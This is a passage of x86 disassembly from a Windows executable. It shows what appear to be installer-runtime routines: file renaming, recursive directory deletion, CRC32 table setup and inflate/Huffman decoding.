  40651f:	0f 84 5e 01 00 00    	je     0x406683
  406525:	3b c6                	cmp    %esi,%eax
  406527:	0f 8f 56 01 00 00    	jg     0x406683
  40652d:	55                   	push   %ebp
  40652e:	55                   	push   %ebp
  40652f:	56                   	push   %esi
  406530:	68 30 46 46 00       	push   $0x464630
  406535:	6a ff                	push   $0xffffffff
  406537:	53                   	push   %ebx
  406538:	8b 1d 44 81 40 00    	mov    0x408144,%ebx
  40653e:	55                   	push   %ebp
  40653f:	55                   	push   %ebp
  406540:	ff d3                	call   *%ebx
  406542:	85 c0                	test   %eax,%eax
  406544:	0f 84 39 01 00 00    	je     0x406683
  40654a:	55                   	push   %ebp
  40654b:	55                   	push   %ebp
  40654c:	56                   	push   %esi
  40654d:	be 80 4c 46 00       	mov    $0x464c80,%esi
  406552:	56                   	push   %esi
  406553:	6a ff                	push   $0xffffffff
  406555:	57                   	push   %edi
  406556:	55                   	push   %ebp
  406557:	55                   	push   %ebp
  406558:	ff d3                	call   *%ebx
  40655a:	85 c0                	test   %eax,%eax
  40655c:	0f 84 21 01 00 00    	je     0x406683
  406562:	56                   	push   %esi
  406563:	68 30 46 46 00       	push   $0x464630
  406568:	68 cc 89 40 00       	push   $0x4089cc
  40656d:	68 80 50 46 00       	push   $0x465080
  406572:	ff 15 18 82 40 00    	call   *0x408218
  406578:	83 c4 10             	add    $0x10,%esp
  40657b:	8b d8                	mov    %eax,%ebx
  40657d:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  406582:	ff b0 28 01 00 00    	push   0x128(%eax)
  406588:	57                   	push   %edi
  406589:	e8 9f fc ff ff       	call   0x40622d
  40658e:	6a 04                	push   $0x4
  406590:	68 00 00 00 c0       	push   $0xc0000000
  406595:	57                   	push   %edi
  406596:	e8 c6 f4 ff ff       	call   0x405a61
  40659b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40659f:	83 f8 ff             	cmp    $0xffffffff,%eax
  4065a2:	0f 84 db 00 00 00    	je     0x406683
  4065a8:	55                   	push   %ebp
  4065a9:	50                   	push   %eax
  4065aa:	ff 15 98 80 40 00    	call   *0x408098
  4065b0:	8b f8                	mov    %eax,%edi
  4065b2:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4065b6:	50                   	push   %eax
  4065b7:	6a 40                	push   $0x40
  4065b9:	ff 15 20 81 40 00    	call   *0x408120
  4065bf:	8b f0                	mov    %eax,%esi
  4065c1:	3b f5                	cmp    %ebp,%esi
  4065c3:	0f 84 b0 00 00 00    	je     0x406679
  4065c9:	55                   	push   %ebp
  4065ca:	8d 44 24 14          	lea    0x14(%esp),%eax
  4065ce:	50                   	push   %eax
  4065cf:	57                   	push   %edi
  4065d0:	56                   	push   %esi
  4065d1:	ff 74 24 2c          	push   0x2c(%esp)
  4065d5:	ff 15 54 81 40 00    	call   *0x408154
  4065db:	85 c0                	test   %eax,%eax
  4065dd:	0f 84 96 00 00 00    	je     0x406679
  4065e3:	3b 7c 24 10          	cmp    0x10(%esp),%edi
  4065e7:	0f 85 8c 00 00 00    	jne    0x406679
  4065ed:	68 28 88 40 00       	push   $0x408828
  4065f2:	56                   	push   %esi
  4065f3:	e8 cf f3 ff ff       	call   0x4059c7
  4065f8:	3b c5                	cmp    %ebp,%eax
  4065fa:	75 14                	jne    0x406610
  4065fc:	68 28 88 40 00       	push   $0x408828
  406601:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406604:	50                   	push   %eax
  406605:	ff 15 0c 81 40 00    	call   *0x40810c
  40660b:	83 c7 0a             	add    $0xa,%edi
  40660e:	eb 31                	jmp    0x406641
  406610:	68 c8 89 40 00       	push   $0x4089c8
  406615:	83 c0 0a             	add    $0xa,%eax
  406618:	50                   	push   %eax
  406619:	e8 a9 f3 ff ff       	call   0x4059c7
  40661e:	8b e8                	mov    %eax,%ebp
  406620:	85 ed                	test   %ebp,%ebp
  406622:	74 1b                	je     0x40663f
  406624:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406627:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40662a:	eb 06                	jmp    0x406632
  40662c:	8a 11                	mov    (%ecx),%dl
  40662e:	88 10                	mov    %dl,(%eax)
  406630:	48                   	dec    %eax
  406631:	49                   	dec    %ecx
  406632:	3b cd                	cmp    %ebp,%ecx
  406634:	77 f6                	ja     0x40662c
  406636:	2b ee                	sub    %esi,%ebp
  406638:	45                   	inc    %ebp
  406639:	8b c5                	mov    %ebp,%eax
  40663b:	33 ed                	xor    %ebp,%ebp
  40663d:	eb 04                	jmp    0x406643
  40663f:	33 ed                	xor    %ebp,%ebp
  406641:	8b c7                	mov    %edi,%eax
  406643:	53                   	push   %ebx
  406644:	68 80 50 46 00       	push   $0x465080
  406649:	03 c6                	add    %esi,%eax
  40664b:	50                   	push   %eax
  40664c:	e8 cc f3 ff ff       	call   0x405a1d
  406651:	55                   	push   %ebp
  406652:	55                   	push   %ebp
  406653:	55                   	push   %ebp
  406654:	ff 74 24 28          	push   0x28(%esp)
  406658:	ff 15 5c 81 40 00    	call   *0x40815c
  40665e:	55                   	push   %ebp
  40665f:	8d 44 24 14          	lea    0x14(%esp),%eax
  406663:	50                   	push   %eax
  406664:	03 fb                	add    %ebx,%edi
  406666:	57                   	push   %edi
  406667:	56                   	push   %esi
  406668:	ff 74 24 2c          	push   0x2c(%esp)
  40666c:	ff 15 50 81 40 00    	call   *0x408150
  406672:	56                   	push   %esi
  406673:	ff 15 2c 81 40 00    	call   *0x40812c
  406679:	ff 74 24 1c          	push   0x1c(%esp)
  40667d:	ff 15 bc 80 40 00    	call   *0x4080bc
  406683:	5f                   	pop    %edi
  406684:	5e                   	pop    %esi
  406685:	5d                   	pop    %ebp
  406686:	5b                   	pop    %ebx
  406687:	59                   	pop    %ecx
  406688:	c3                   	ret
  406689:	6a 01                	push   $0x1
  40668b:	e8 92 f6 ff ff       	call   0x405d22
  406690:	85 c0                	test   %eax,%eax
  406692:	74 10                	je     0x4066a4
  406694:	6a 05                	push   $0x5
  406696:	ff 74 24 0c          	push   0xc(%esp)
  40669a:	ff 74 24 0c          	push   0xc(%esp)
  40669e:	ff d0                	call   *%eax
  4066a0:	85 c0                	test   %eax,%eax
  4066a2:	75 0f                	jne    0x4066b3
  4066a4:	ff 74 24 08          	push   0x8(%esp)
  4066a8:	ff 74 24 08          	push   0x8(%esp)
  4066ac:	e8 0d fe ff ff       	call   0x4064be
  4066b1:	59                   	pop    %ecx
  4066b2:	59                   	pop    %ecx
  4066b3:	ff 05 70 b3 47 00    	incl   0x47b370
  4066b9:	c2 08 00             	ret    $0x8
  4066bc:	55                   	push   %ebp
  4066bd:	8b ec                	mov    %esp,%ebp
  4066bf:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  4066c5:	53                   	push   %ebx
  4066c6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4066c9:	53                   	push   %ebx
  4066ca:	e8 d6 fa ff ff       	call   0x4061a5
  4066cf:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4066d2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4066d5:	f6 c1 08             	test   $0x8,%cl
  4066d8:	74 17                	je     0x4066f1
  4066da:	53                   	push   %ebx
  4066db:	ff 15 6c 81 40 00    	call   *0x40816c
  4066e1:	f7 d8                	neg    %eax
  4066e3:	1b c0                	sbb    %eax,%eax
  4066e5:	40                   	inc    %eax
  4066e6:	01 05 68 b3 47 00    	add    %eax,0x47b368
  4066ec:	e9 a6 01 00 00       	jmp    0x406897
  4066f1:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4066f4:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  4066f8:	56                   	push   %esi
  4066f9:	74 11                	je     0x40670c
  4066fb:	85 c0                	test   %eax,%eax
  4066fd:	0f 84 3f 01 00 00    	je     0x406842
  406703:	f6 c1 02             	test   $0x2,%cl
  406706:	0f 84 36 01 00 00    	je     0x406842
  40670c:	57                   	push   %edi
  40670d:	53                   	push   %ebx
  40670e:	be 80 54 46 00       	mov    $0x465480,%esi
  406713:	56                   	push   %esi
  406714:	e8 02 f5 ff ff       	call   0x405c1b
  406719:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40671d:	8b 3d e8 80 40 00    	mov    0x4080e8,%edi
  406723:	74 0a                	je     0x40672f
  406725:	68 dc 89 40 00       	push   $0x4089dc
  40672a:	56                   	push   %esi
  40672b:	ff d7                	call   *%edi
  40672d:	eb 06                	jmp    0x406735
  40672f:	53                   	push   %ebx
  406730:	e8 43 fa ff ff       	call   0x406178
  406735:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  406739:	75 0a                	jne    0x406745
  40673b:	66 83 3d 80 54 46 00 	cmpw   $0x5c,0x465480
  406742:	5c 
  406743:	75 08                	jne    0x40674d
  406745:	68 c8 82 40 00       	push   $0x4082c8
  40674a:	53                   	push   %ebx
  40674b:	ff d7                	call   *%edi
  40674d:	53                   	push   %ebx
  40674e:	ff 15 c0 80 40 00    	call   *0x4080c0
  406754:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  406757:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40675a:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  406760:	50                   	push   %eax
  406761:	56                   	push   %esi
  406762:	ff 15 68 81 40 00    	call   *0x408168
  406768:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40676b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40676e:	0f 84 bd 00 00 00    	je     0x406831
  406774:	8d b5 d0 fd ff ff    	lea    -0x230(%ebp),%esi
  40677a:	6a 3f                	push   $0x3f
  40677c:	8b c6                	mov    %esi,%eax
  40677e:	50                   	push   %eax
  40677f:	e8 92 f1 ff ff       	call   0x405916
  406784:	33 ff                	xor    %edi,%edi
  406786:	66 39 38             	cmp    %di,(%eax)
  406789:	74 09                	je     0x406794
  40678b:	66 39 7d d8          	cmp    %di,-0x28(%ebp)
  40678f:	74 03                	je     0x406794
  406791:	8d 75 d8             	lea    -0x28(%ebp),%esi
  406794:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  406798:	75 15                	jne    0x4067af
  40679a:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  40679e:	66 3b c7             	cmp    %di,%ax
  4067a1:	74 6b                	je     0x40680e
  4067a3:	66 83 f8 2e          	cmp    $0x2e,%ax
  4067a7:	75 06                	jne    0x4067af
  4067a9:	66 39 7e 04          	cmp    %di,0x4(%esi)
  4067ad:	74 5f                	je     0x40680e
  4067af:	56                   	push   %esi
  4067b0:	ff 75 fc             	push   -0x4(%ebp)
  4067b3:	e8 63 f4 ff ff       	call   0x405c1b
  4067b8:	f6 85 a4 fd ff ff 10 	testb  $0x10,-0x25c(%ebp)
  4067bf:	74 15                	je     0x4067d6
  4067c1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4067c4:	83 e0 03             	and    $0x3,%eax
  4067c7:	3c 03                	cmp    $0x3,%al
  4067c9:	75 43                	jne    0x40680e
  4067cb:	ff 75 0c             	push   0xc(%ebp)
  4067ce:	53                   	push   %ebx
  4067cf:	e8 e8 fe ff ff       	call   0x4066bc
  4067d4:	eb 38                	jmp    0x40680e
  4067d6:	53                   	push   %ebx
  4067d7:	e8 65 f2 ff ff       	call   0x405a41
  4067dc:	53                   	push   %ebx
  4067dd:	ff 15 6c 81 40 00    	call   *0x40816c
  4067e3:	85 c0                	test   %eax,%eax
  4067e5:	75 1f                	jne    0x406806
  4067e7:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  4067eb:	74 11                	je     0x4067fe
  4067ed:	53                   	push   %ebx
  4067ee:	6a f1                	push   $0xfffffff1
  4067f0:	e8 e1 e3 ff ff       	call   0x404bd6
  4067f5:	57                   	push   %edi
  4067f6:	53                   	push   %ebx
  4067f7:	e8 8d fe ff ff       	call   0x406689
  4067fc:	eb 10                	jmp    0x40680e
  4067fe:	ff 05 68 b3 47 00    	incl   0x47b368
  406804:	eb 08                	jmp    0x40680e
  406806:	53                   	push   %ebx
  406807:	6a f2                	push   $0xfffffff2
  406809:	e8 c8 e3 ff ff       	call   0x404bd6
  40680e:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  406814:	50                   	push   %eax
  406815:	ff 75 f8             	push   -0x8(%ebp)
  406818:	ff 15 64 81 40 00    	call   *0x408164
  40681e:	85 c0                	test   %eax,%eax
  406820:	0f 85 4e ff ff ff    	jne    0x406774
  406826:	ff 75 f8             	push   -0x8(%ebp)
  406829:	ff 15 60 81 40 00    	call   *0x408160
  40682f:	eb 02                	jmp    0x406833
  406831:	33 ff                	xor    %edi,%edi
  406833:	39 7d 08             	cmp    %edi,0x8(%ebp)
  406836:	5f                   	pop    %edi
  406837:	74 09                	je     0x406842
  406839:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40683c:	33 c0                	xor    %eax,%eax
  40683e:	66 89 41 fe          	mov    %ax,-0x2(%ecx)
  406842:	33 f6                	xor    %esi,%esi
  406844:	39 75 08             	cmp    %esi,0x8(%ebp)
  406847:	74 4d                	je     0x406896
  406849:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  40684c:	74 38                	je     0x406886
  40684e:	53                   	push   %ebx
  40684f:	e8 a7 f4 ff ff       	call   0x405cfb
  406854:	85 c0                	test   %eax,%eax
  406856:	74 3e                	je     0x406896
  406858:	53                   	push   %ebx
  406859:	e8 eb f8 ff ff       	call   0x406149
  40685e:	53                   	push   %ebx
  40685f:	e8 dd f1 ff ff       	call   0x405a41
  406864:	53                   	push   %ebx
  406865:	ff 15 10 81 40 00    	call   *0x408110
  40686b:	85 c0                	test   %eax,%eax
  40686d:	75 1f                	jne    0x40688e
  40686f:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  406873:	74 11                	je     0x406886
  406875:	53                   	push   %ebx
  406876:	6a f1                	push   $0xfffffff1
  406878:	e8 59 e3 ff ff       	call   0x404bd6
  40687d:	56                   	push   %esi
  40687e:	53                   	push   %ebx
  40687f:	e8 05 fe ff ff       	call   0x406689
  406884:	eb 10                	jmp    0x406896
  406886:	ff 05 68 b3 47 00    	incl   0x47b368
  40688c:	eb 08                	jmp    0x406896
  40688e:	53                   	push   %ebx
  40688f:	6a e5                	push   $0xffffffe5
  406891:	e8 40 e3 ff ff       	call   0x404bd6
  406896:	5e                   	pop    %esi
  406897:	5b                   	pop    %ebx
  406898:	c9                   	leave
  406899:	c2 08 00             	ret    $0x8
  40689c:	55                   	push   %ebp
  40689d:	8b ec                	mov    %esp,%ebp
  40689f:	83 3d 8c 9c 46 00 00 	cmpl   $0x0,0x469c8c
  4068a6:	75 32                	jne    0x4068da
  4068a8:	33 c9                	xor    %ecx,%ecx
  4068aa:	56                   	push   %esi
  4068ab:	6a 08                	push   $0x8
  4068ad:	8b c1                	mov    %ecx,%eax
  4068af:	5e                   	pop    %esi
  4068b0:	8b d0                	mov    %eax,%edx
  4068b2:	80 e2 01             	and    $0x1,%dl
  4068b5:	0f b6 d2             	movzbl %dl,%edx
  4068b8:	f7 da                	neg    %edx
  4068ba:	1b d2                	sbb    %edx,%edx
  4068bc:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  4068c2:	d1 e8                	shr    $1,%eax
  4068c4:	33 c2                	xor    %edx,%eax
  4068c6:	4e                   	dec    %esi
  4068c7:	75 e7                	jne    0x4068b0
  4068c9:	89 04 8d 88 9c 46 00 	mov    %eax,0x469c88(,%ecx,4)
  4068d0:	41                   	inc    %ecx
  4068d1:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4068d7:	7c d2                	jl     0x4068ab
  4068d9:	5e                   	pop    %esi
  4068da:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4068de:	8b 45 08             	mov    0x8(%ebp),%eax
  4068e1:	f7 d0                	not    %eax
  4068e3:	76 22                	jbe    0x406907
  4068e5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4068e8:	0f b6 11             	movzbl (%ecx),%edx
  4068eb:	ff 4d 10             	decl   0x10(%ebp)
  4068ee:	33 d0                	xor    %eax,%edx
  4068f0:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4068f6:	c1 e8 08             	shr    $0x8,%eax
  4068f9:	33 04 95 88 9c 46 00 	xor    0x469c88(,%edx,4),%eax
  406900:	41                   	inc    %ecx
  406901:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406905:	77 e1                	ja     0x4068e8
  406907:	f7 d0                	not    %eax
  406909:	5d                   	pop    %ebp
  40690a:	c2 0c 00             	ret    $0xc
  40690d:	53                   	push   %ebx
  40690e:	57                   	push   %edi
  40690f:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  406915:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  40691b:	3b fb                	cmp    %ebx,%edi
  40691d:	76 06                	jbe    0x406925
  40691f:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  406925:	8b 46 0c             	mov    0xc(%esi),%eax
  406928:	2b df                	sub    %edi,%ebx
  40692a:	3b d8                	cmp    %eax,%ebx
  40692c:	72 02                	jb     0x406930
  40692e:	8b d8                	mov    %eax,%ebx
  406930:	53                   	push   %ebx
  406931:	57                   	push   %edi
  406932:	ff 76 08             	push   0x8(%esi)
  406935:	2b c3                	sub    %ebx,%eax
  406937:	89 46 0c             	mov    %eax,0xc(%esi)
  40693a:	e8 de f0 ff ff       	call   0x405a1d
  40693f:	01 5e 08             	add    %ebx,0x8(%esi)
  406942:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  406948:	03 fb                	add    %ebx,%edi
  40694a:	3b f8                	cmp    %eax,%edi
  40694c:	75 16                	jne    0x406964
  40694e:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  406954:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  40695a:	75 b9                	jne    0x406915
  40695c:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  406962:	eb b1                	jmp    0x406915
  406964:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  40696a:	5f                   	pop    %edi
  40696b:	5b                   	pop    %ebx
  40696c:	c3                   	ret
  40696d:	55                   	push   %ebp
  40696e:	8d 6c 24 a8          	lea    -0x58(%esp),%ebp
  406972:	81 ec f0 00 00 00    	sub    $0xf0,%esp
  406978:	56                   	push   %esi
  406979:	57                   	push   %edi
  40697a:	6a 10                	push   $0x10
  40697c:	8b f0                	mov    %eax,%esi
  40697e:	59                   	pop    %ecx
  40697f:	33 c0                	xor    %eax,%eax
  406981:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  406984:	f3 ab                	rep stos %eax,%es:(%edi)
  406986:	8b 7d 64             	mov    0x64(%ebp),%edi
  406989:	8b 4d 60             	mov    0x60(%ebp),%ecx
  40698c:	8b d7                	mov    %edi,%edx
  40698e:	8b 01                	mov    (%ecx),%eax
  406990:	8d 44 85 e4          	lea    -0x1c(%ebp,%eax,4),%eax
  406994:	ff 00                	incl   (%eax)
  406996:	83 c1 04             	add    $0x4,%ecx
  406999:	4a                   	dec    %edx
  40699a:	75 f2                	jne    0x40698e
  40699c:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  40699f:	75 0e                	jne    0x4069af
  4069a1:	8b 45 74             	mov    0x74(%ebp),%eax
  4069a4:	21 10                	and    %edx,(%eax)
  4069a6:	21 16                	and    %edx,(%esi)
  4069a8:	33 c0                	xor    %eax,%eax
  4069aa:	e9 d8 02 00 00       	jmp    0x406c87
  4069af:	8b 06                	mov    (%esi),%eax
  4069b1:	6a 0f                	push   $0xf
  4069b3:	33 ff                	xor    %edi,%edi
  4069b5:	47                   	inc    %edi
  4069b6:	5a                   	pop    %edx
  4069b7:	89 45 54             	mov    %eax,0x54(%ebp)
  4069ba:	8b cf                	mov    %edi,%ecx
  4069bc:	53                   	push   %ebx
  4069bd:	33 db                	xor    %ebx,%ebx
  4069bf:	39 5c 8d e4          	cmp    %ebx,-0x1c(%ebp,%ecx,4)
  4069c3:	75 05                	jne    0x4069ca
  4069c5:	41                   	inc    %ecx
  4069c6:	3b ca                	cmp    %edx,%ecx
  4069c8:	76 f3                	jbe    0x4069bd
  4069ca:	89 4d 50             	mov    %ecx,0x50(%ebp)
  4069cd:	3b c1                	cmp    %ecx,%eax
  4069cf:	73 03                	jae    0x4069d4
  4069d1:	89 4d 54             	mov    %ecx,0x54(%ebp)
  4069d4:	39 5c 95 e4          	cmp    %ebx,-0x1c(%ebp,%edx,4)
  4069d8:	75 03                	jne    0x4069dd
  4069da:	4a                   	dec    %edx
  4069db:	75 f7                	jne    0x4069d4
  4069dd:	89 55 40             	mov    %edx,0x40(%ebp)
  4069e0:	39 55 54             	cmp    %edx,0x54(%ebp)
  4069e3:	76 03                	jbe    0x4069e8
  4069e5:	89 55 54             	mov    %edx,0x54(%ebp)
  4069e8:	8b 45 54             	mov    0x54(%ebp),%eax
  4069eb:	89 06                	mov    %eax,(%esi)
  4069ed:	d3 e7                	shl    %cl,%edi
  4069ef:	eb 0d                	jmp    0x4069fe
  4069f1:	2b 7c 8d e4          	sub    -0x1c(%ebp,%ecx,4),%edi
  4069f5:	0f 88 95 02 00 00    	js     0x406c90
  4069fb:	41                   	inc    %ecx
  4069fc:	03 ff                	add    %edi,%edi
  4069fe:	3b ca                	cmp    %edx,%ecx
  406a00:	72 ef                	jb     0x4069f1
  406a02:	8b ca                	mov    %edx,%ecx
  406a04:	c1 e1 02             	shl    $0x2,%ecx
  406a07:	8d 44 0d e4          	lea    -0x1c(%ebp,%ecx,1),%eax
  406a0b:	8b 30                	mov    (%eax),%esi
  406a0d:	2b fe                	sub    %esi,%edi
  406a0f:	89 7d 24             	mov    %edi,0x24(%ebp)
  406a12:	0f 88 78 02 00 00    	js     0x406c90
  406a18:	03 f7                	add    %edi,%esi
  406a1a:	89 30                	mov    %esi,(%eax)
  406a1c:	33 c0                	xor    %eax,%eax
  406a1e:	4a                   	dec    %edx
  406a1f:	89 5d a8             	mov    %ebx,-0x58(%ebp)
  406a22:	74 10                	je     0x406a34
  406a24:	33 f6                	xor    %esi,%esi
  406a26:	03 44 35 e8          	add    -0x18(%ebp,%esi,1),%eax
  406a2a:	83 c6 04             	add    $0x4,%esi
  406a2d:	4a                   	dec    %edx
  406a2e:	89 44 35 a8          	mov    %eax,-0x58(%ebp,%esi,1)
  406a32:	75 f2                	jne    0x406a26
  406a34:	8b 5d 60             	mov    0x60(%ebp),%ebx
  406a37:	33 f6                	xor    %esi,%esi
  406a39:	8b 03                	mov    (%ebx),%eax
  406a3b:	83 c3 04             	add    $0x4,%ebx
  406a3e:	85 c0                	test   %eax,%eax
  406a40:	74 10                	je     0x406a52
  406a42:	8d 44 85 a4          	lea    -0x5c(%ebp,%eax,4),%eax
  406a46:	8b 10                	mov    (%eax),%edx
  406a48:	89 34 95 90 a0 46 00 	mov    %esi,0x46a090(,%edx,4)
  406a4f:	42                   	inc    %edx
  406a50:	89 10                	mov    %edx,(%eax)
  406a52:	46                   	inc    %esi
  406a53:	3b 75 64             	cmp    0x64(%ebp),%esi
  406a56:	72 e1                	jb     0x406a39
  406a58:	8b 44 0d a4          	mov    -0x5c(%ebp,%ecx,1),%eax
  406a5c:	8b 4d 50             	mov    0x50(%ebp),%ecx
  406a5f:	83 4d 48 ff          	orl    $0xffffffff,0x48(%ebp)
  406a63:	89 45 64             	mov    %eax,0x64(%ebp)
  406a66:	8b 45 54             	mov    0x54(%ebp),%eax
  406a69:	33 db                	xor    %ebx,%ebx
  406a6b:	f7 d8                	neg    %eax
  406a6d:	3b 4d 40             	cmp    0x40(%ebp),%ecx
  406a70:	89 5d 4c             	mov    %ebx,0x4c(%ebp)
  406a73:	89 5d a4             	mov    %ebx,-0x5c(%ebp)
  406a76:	c7 45 38 90 a0 46 00 	movl   $0x46a090,0x38(%ebp)
  406a7d:	89 9d 68 ff ff ff    	mov    %ebx,-0x98(%ebp)
  406a83:	89 5d 28             	mov    %ebx,0x28(%ebp)
  406a86:	0f 8f ee 01 00 00    	jg     0x406c7a
  406a8c:	8d 51 ff             	lea    -0x1(%ecx),%edx
  406a8f:	8d 4c 8d e4          	lea    -0x1c(%ebp,%ecx,4),%ecx
  406a93:	89 55 30             	mov    %edx,0x30(%ebp)
  406a96:	89 4d 34             	mov    %ecx,0x34(%ebp)
  406a99:	8b 4d 34             	mov    0x34(%ebp),%ecx
  406a9c:	8b 31                	mov    (%ecx),%esi
  406a9e:	85 f6                	test   %esi,%esi
  406aa0:	0f 84 be 01 00 00    	je     0x406c64
  406aa6:	eb 03                	jmp    0x406aab
  406aa8:	8b 75 2c             	mov    0x2c(%ebp),%esi
  406aab:	8b 4d 54             	mov    0x54(%ebp),%ecx
  406aae:	03 c8                	add    %eax,%ecx
  406ab0:	4e                   	dec    %esi
  406ab1:	39 4d 50             	cmp    %ecx,0x50(%ebp)
  406ab4:	89 75 2c             	mov    %esi,0x2c(%ebp)
  406ab7:	89 4d 3c             	mov    %ecx,0x3c(%ebp)
  406aba:	0f 8e cc 00 00 00    	jle    0x406b8c
  406ac0:	46                   	inc    %esi
  406ac1:	89 75 44             	mov    %esi,0x44(%ebp)
  406ac4:	8b 75 40             	mov    0x40(%ebp),%esi
  406ac7:	2b 75 3c             	sub    0x3c(%ebp),%esi
  406aca:	ff 45 48             	incl   0x48(%ebp)
  406acd:	3b 75 54             	cmp    0x54(%ebp),%esi
  406ad0:	76 03                	jbe    0x406ad5
  406ad2:	8b 75 54             	mov    0x54(%ebp),%esi
  406ad5:	8b 4d 50             	mov    0x50(%ebp),%ecx
  406ad8:	2b 4d 3c             	sub    0x3c(%ebp),%ecx
  406adb:	33 d2                	xor    %edx,%edx
  406add:	42                   	inc    %edx
  406ade:	d3 e2                	shl    %cl,%edx
  406ae0:	3b 55 44             	cmp    0x44(%ebp),%edx
  406ae3:	76 23                	jbe    0x406b08
  406ae5:	8b 5d 34             	mov    0x34(%ebp),%ebx
  406ae8:	83 cf ff             	or     $0xffffffff,%edi
  406aeb:	2b 7d 2c             	sub    0x2c(%ebp),%edi
  406aee:	03 d7                	add    %edi,%edx
  406af0:	3b ce                	cmp    %esi,%ecx
  406af2:	73 14                	jae    0x406b08
  406af4:	eb 0d                	jmp    0x406b03
  406af6:	83 c3 04             	add    $0x4,%ebx
  406af9:	8b 3b                	mov    (%ebx),%edi
  406afb:	03 d2                	add    %edx,%edx
  406afd:	3b d7                	cmp    %edi,%edx
  406aff:	76 07                	jbe    0x406b08
  406b01:	2b d7                	sub    %edi,%edx
  406b03:	41                   	inc    %ecx
  406b04:	3b ce                	cmp    %esi,%ecx
  406b06:	72 ee                	jb     0x406af6
  406b08:	8b 55 7c             	mov    0x7c(%ebp),%edx
  406b0b:	8b 12                	mov    (%edx),%edx
  406b0d:	33 f6                	xor    %esi,%esi
  406b0f:	46                   	inc    %esi
  406b10:	d3 e6                	shl    %cl,%esi
  406b12:	8d 3c 32             	lea    (%edx,%esi,1),%edi
  406b15:	89 75 28             	mov    %esi,0x28(%ebp)
  406b18:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  406b1e:	0f 87 6c 01 00 00    	ja     0x406c90
  406b24:	8b 75 78             	mov    0x78(%ebp),%esi
  406b27:	8d 1c 96             	lea    (%esi,%edx,4),%ebx
  406b2a:	8b 55 7c             	mov    0x7c(%ebp),%edx
  406b2d:	8b 75 48             	mov    0x48(%ebp),%esi
  406b30:	89 3a                	mov    %edi,(%edx)
  406b32:	8b 55 48             	mov    0x48(%ebp),%edx
  406b35:	8d b4 b5 68 ff ff ff 	lea    -0x98(%ebp,%esi,4),%esi
  406b3c:	89 1e                	mov    %ebx,(%esi)
  406b3e:	85 d2                	test   %edx,%edx
  406b40:	74 2e                	je     0x406b70
  406b42:	8b 7d 4c             	mov    0x4c(%ebp),%edi
  406b45:	8b 76 fc             	mov    -0x4(%esi),%esi
  406b48:	89 7c 95 a4          	mov    %edi,-0x5c(%ebp,%edx,4)
  406b4c:	8a 55 54             	mov    0x54(%ebp),%dl
  406b4f:	88 55 61             	mov    %dl,0x61(%ebp)
  406b52:	88 4d 60             	mov    %cl,0x60(%ebp)
  406b55:	8b c8                	mov    %eax,%ecx
  406b57:	8b d7                	mov    %edi,%edx
  406b59:	d3 ea                	shr    %cl,%edx
  406b5b:	8b c3                	mov    %ebx,%eax
  406b5d:	2b c6                	sub    %esi,%eax
  406b5f:	c1 f8 02             	sar    $0x2,%eax
  406b62:	2b c2                	sub    %edx,%eax
  406b64:	66 89 45 62          	mov    %ax,0x62(%ebp)
  406b68:	8b 45 60             	mov    0x60(%ebp),%eax
  406b6b:	89 04 96             	mov    %eax,(%esi,%edx,4)
  406b6e:	eb 05                	jmp    0x406b75
  406b70:	8b 45 74             	mov    0x74(%ebp),%eax
  406b73:	89 18                	mov    %ebx,(%eax)
  406b75:	8b 4d 3c             	mov    0x3c(%ebp),%ecx
  406b78:	8b c1                	mov    %ecx,%eax
  406b7a:	03 4d 54             	add    0x54(%ebp),%ecx
  406b7d:	39 4d 50             	cmp    %ecx,0x50(%ebp)
  406b80:	89 4d 3c             	mov    %ecx,0x3c(%ebp)
  406b83:	0f 8f 3b ff ff ff    	jg     0x406ac4
  406b89:	8b 7d 24             	mov    0x24(%ebp),%edi
  406b8c:	8a 4d 50             	mov    0x50(%ebp),%cl
  406b8f:	8b 75 38             	mov    0x38(%ebp),%esi
  406b92:	2a c8                	sub    %al,%cl
  406b94:	88 4d 61             	mov    %cl,0x61(%ebp)
  406b97:	8b 4d 64             	mov    0x64(%ebp),%ecx
